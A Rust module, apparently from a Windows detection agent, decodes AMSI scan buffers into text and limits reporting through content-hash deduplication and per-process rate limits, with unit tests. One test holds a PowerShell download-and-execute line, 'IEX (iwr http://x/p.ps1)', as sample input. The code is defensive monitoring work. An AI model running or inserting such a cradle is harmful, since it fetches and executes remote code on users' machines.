//! AMSI content (#282): turning EID 1101's binary buffer into text, and the
//! volume gate in front of the sink.
//!
//! AMSI rescans the same content constantly (a module imported by every
//! `PowerShell` session, the profile script, Defender's own scans), and one
//! busy script host can scan thousands of fragments a minute. The issue's
//! requirement is to *see* everything new but not ship every rescan to the
//! correlator, and #408 showed the real-time consumer must stay cheap. So:
//! identical content (AMSI's own SHA-256) is reported once per
//! [`DEDUP_WINDOW_NS`], and a process is capped at [`PER_PID_LIMIT`] events
//! per [`PER_PID_WINDOW_NS`]. Both drops are counted, never silent.

use std::collections::HashMap;

use crate::budget::PidBudget;

/// Text kept per event, in UTF-16 code units' worth of characters. The point
/// of the signal is the decoded payload, so this is generous; past it the
/// event says `text_truncated`.
pub(crate) const TEXT_LIMIT_CHARS: usize = 16 * 1024;
/// Identical content seen again within this window is a rescan, not news.
pub(crate) const DEDUP_WINDOW_NS: u64 = 300_000_000_000;
/// Distinct hashes remembered at once; past it the oldest are forgotten.
pub(crate) const DEDUP_CAP: usize = 4_096;
/// Per-process budget: events in one window.
pub(crate) const PER_PID_LIMIT: u32 = 64;
/// Per-process budget: window length.
pub(crate) const PER_PID_WINDOW_NS: u64 = 10_000_000_000;

/// A text buffer has few control characters; an assembly image or VBA p-code
/// is mostly them. Above this share the buffer is not reported as text.
const MAX_CONTROL_SHARE_PERCENT: usize = 10;

/// The scanned buffer as text: UTF-16LE, as the script runtimes hand it to
/// AMSI. `None` for a filtered, empty or non-text buffer (a .NET assembly
/// starts with `MZ`, VBA p-code is mostly control bytes). The bool says the
/// text was cut to [`TEXT_LIMIT_CHARS`].
pub(crate) fn decode_text(content: &[u8], filtered: bool) -> Option<(String, bool)> {
    if filtered || content.len() < 2 || content.starts_with(b"MZ") {
        return None;
    }
    let units: Vec<u16> = content
        .chunks_exact(2)
        .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
        .collect();
    let text = String::from_utf16_lossy(&units);
    let text = text.trim_end_matches('\0');
    let total = text.chars().count();
    if total == 0 {
        return None;
    }
    let control = text
        .chars()
        .filter(|c| c.is_control() && !matches!(c, '\t' | '\n' | '\r'))
        .count();
    if control * 100 > total * MAX_CONTROL_SHARE_PERCENT {
        return None;
    }
    if total > TEXT_LIMIT_CHARS {
        Some((text.chars().take(TEXT_LIMIT_CHARS).collect(), true))
    } else {
        Some((text.to_string(), false))
    }
}

/// Lowercase hex of AMSI's hash field.
pub(crate) fn hex(bytes: &[u8]) -> String {
    use std::fmt::Write as _;
    bytes
        .iter()
        .fold(String::with_capacity(bytes.len() * 2), |mut s, b| {
            let _ = write!(s, "{b:02x}");
            s
        })
}

/// Why [`AmsiGate::admit`] refused an event.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Refusal {
    /// Same content within [`DEDUP_WINDOW_NS`].
    Duplicate,
    /// The process spent its [`PER_PID_LIMIT`] for this window.
    RateLimited,
}

/// Dedup + per-process budget, see the module doc.
#[derive(Debug)]
pub(crate) struct AmsiGate {
    /// content hash → last time it was admitted.
    seen: HashMap<String, u64>,
    budget: PidBudget,
    pub(crate) duplicates: u64,
}

impl Default for AmsiGate {
    fn default() -> Self {
        Self {
            seen: HashMap::new(),
            budget: PidBudget::new(PER_PID_LIMIT, PER_PID_WINDOW_NS),
            duplicates: 0,
        }
    }
}

impl AmsiGate {
    /// Whether to report this scan. An empty `hash` (field missing) is never
    /// deduplicated, only budgeted.
    pub(crate) fn admit(&mut self, pid: u32, hash: &str, now_ns: u64) -> Result<(), Refusal> {
        if !hash.is_empty()
            && self
                .seen
                .get(hash)
                .is_some_and(|&t| now_ns.saturating_sub(t) < DEDUP_WINDOW_NS)
        {
            self.duplicates += 1;
            return Err(Refusal::Duplicate);
        }

        if !self.budget.spend(pid, now_ns) {
            return Err(Refusal::RateLimited);
        }

        if !hash.is_empty() {
            if self.seen.len() >= DEDUP_CAP {
                self.seen
                    .retain(|_, t| now_ns.saturating_sub(*t) < DEDUP_WINDOW_NS);
                if self.seen.len() >= DEDUP_CAP
                    && let Some(oldest) = self
                        .seen
                        .iter()
                        .min_by_key(|(_, t)| **t)
                        .map(|(h, _)| h.clone())
                {
                    self.seen.remove(&oldest);
                }
            }
            self.seen.insert(hash.to_string(), now_ns);
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn utf16(text: &str) -> Vec<u8> {
        text.encode_utf16().flat_map(u16::to_le_bytes).collect()
    }

    #[test]
    fn script_buffers_decode_as_text() {
        let (text, cut) = decode_text(&utf16("IEX (iwr http://x/p.ps1)\r\n"), false).unwrap();
        assert_eq!(text, "IEX (iwr http://x/p.ps1)\r\n");
        assert!(!cut);
    }

    #[test]
    fn trailing_nul_is_dropped() {
        let (text, _) = decode_text(&utf16("whoami\0"), false).unwrap();
        assert_eq!(text, "whoami");
    }

    #[test]
    fn assemblies_filtered_and_empty_buffers_are_not_text() {
        assert_eq!(decode_text(b"MZ\x90\0\x03\0\0\0\x04\0", false), None);
        assert_eq!(
            decode_text(&utf16("Write-Host hi"), true),
            None,
            "contentFiltered"
        );
        assert_eq!(decode_text(&[], false), None);
        assert_eq!(decode_text(&utf16("\0\0"), false), None);
        // VBA p-code-like: mostly control bytes.
        let binary: Vec<u8> = (0u8..64).flat_map(|b| [b % 8, 0]).collect();
        assert_eq!(decode_text(&binary, false), None);
    }

    #[test]
    fn long_text_is_cut_and_flagged() {
        let long = "A".repeat(TEXT_LIMIT_CHARS + 10);
        let (text, cut) = decode_text(&utf16(&long), false).unwrap();
        assert_eq!(text.chars().count(), TEXT_LIMIT_CHARS);
        assert!(cut);
    }

    #[test]
    fn hash_is_lowercase_hex() {
        assert_eq!(hex(&[0x00, 0xAB, 0x0f]), "00ab0f");
    }

    #[test]
    fn identical_content_is_reported_once_per_window() {
        let mut gate = AmsiGate::default();
        assert_eq!(gate.admit(1, "h", 0), Ok(()));
        assert_eq!(
            gate.admit(2, "h", 1_000),
            Err(Refusal::Duplicate),
            "any process"
        );
        assert_eq!(gate.admit(1, "h", DEDUP_WINDOW_NS), Ok(()), "window over");
        assert_eq!(gate.duplicates, 1);
    }

    #[test]
    fn a_process_is_capped_per_window_then_gets_a_fresh_budget() {
        let mut gate = AmsiGate::default();
        for i in 0..PER_PID_LIMIT {
            assert_eq!(gate.admit(7, &format!("h{i}"), u64::from(i)), Ok(()));
        }
        assert_eq!(gate.admit(7, "new", 100), Err(Refusal::RateLimited));
        assert_eq!(
            gate.admit(8, "other-pid", 100),
            Ok(()),
            "budget is per process"
        );
        assert_eq!(gate.admit(7, "new", PER_PID_WINDOW_NS + 1), Ok(()));
        assert_eq!(gate.budget.refused, 1);
    }

    #[test]
    fn a_refused_scan_does_not_mark_its_content_seen() {
        let mut gate = AmsiGate::default();
        for i in 0..PER_PID_LIMIT {
            gate.admit(7, &format!("h{i}"), 0).unwrap();
        }
        assert_eq!(gate.admit(7, "payload", 1), Err(Refusal::RateLimited));
        // Another process scanning the same payload must still be reported.
        assert_eq!(gate.admit(9, "payload", 2), Ok(()));
    }

    #[test]
    fn memory_stays_bounded() {
        let mut gate = AmsiGate::default();
        for i in 0..(DEDUP_CAP as u64 + 100) {
            let pid = u32::try_from(i % 2_000).unwrap();
            let _ = gate.admit(pid, &format!("h{i}"), i);
        }
        assert!(gate.seen.len() <= DEDUP_CAP);
        assert!(gate.budget.tracked() <= 1_024);
    }
}
